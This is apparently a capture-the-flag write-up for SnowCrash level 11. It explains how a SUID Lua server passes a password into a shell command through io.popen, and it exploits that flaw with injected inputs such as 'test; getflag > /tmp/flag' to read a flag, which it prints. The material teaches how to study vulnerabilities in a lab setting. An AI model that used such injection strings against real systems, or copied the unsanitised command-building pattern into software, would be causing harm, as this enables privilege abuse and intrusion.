1. **File search**

    By checking with the `strings` command and running the `level11.lua` binary, we can observe:
    - The executable binary is a Lua script called `level11.lua` and has SUID (setuid) permissions for the user `flag11`.
    - The script uses the Lua `socket` library to create a TCP server that listens on `127.0.0.1:5151`.
    - When a client connects, the server asks for a `"Password: "`.
    - The received password is passed to a system command:
    - `echo <password> | sha1sum`
    - The result (SHA1 hash) is compared to the fixed value:
    `f05d1d066fb246efe0c6f7d095f909a7a0cf34a0`
    - If the hash matches, it responds with `"Gz you dumb*\n"`, otherwise it responds with `"Erf nope..\n"`.
    ```bash
    level11@SnowCrash:~$ nc 127.0.0.1 5151
    Password: 42malaga
    Erf nope..
    ```
    The important part of the code:
    ```bash
    level11@SnowCrash:~$ cat level11.lua
    [...]
    prog = io.popen("echo "..pass.." | sha1sum", "r")
    [...]
    ```
    This is vulnerable to command injection.

    The key point is that the password variable (`pass`) is directly concatenated into the shell command:
    ```lua
    prog = io.popen("echo " .. pass .. " | sha1sum", "r")
    ```
    This means our input is evaluated by the shell. By injecting a special string, we can break out of the echo command and execute arbitrary commands as the `flag11` user (due to the SUID bit).

    For example, if we input:
    ```
    test; getflag
    ```
    The resulting command executed by the script will be:
    ```
    echo test; getflag | sha1sum
    ```
    This will print the output of `getflag` to the client connection, because `getflag` is executed as `flag11`.
    ```bash
    Password: test; getflag > /tmp/flag
    Erf nope..
    level11@SnowCrash:~$ cat /tmp/flag
    .*( )*.
    woupa2yuojeeaaed06riuj63c
    ```


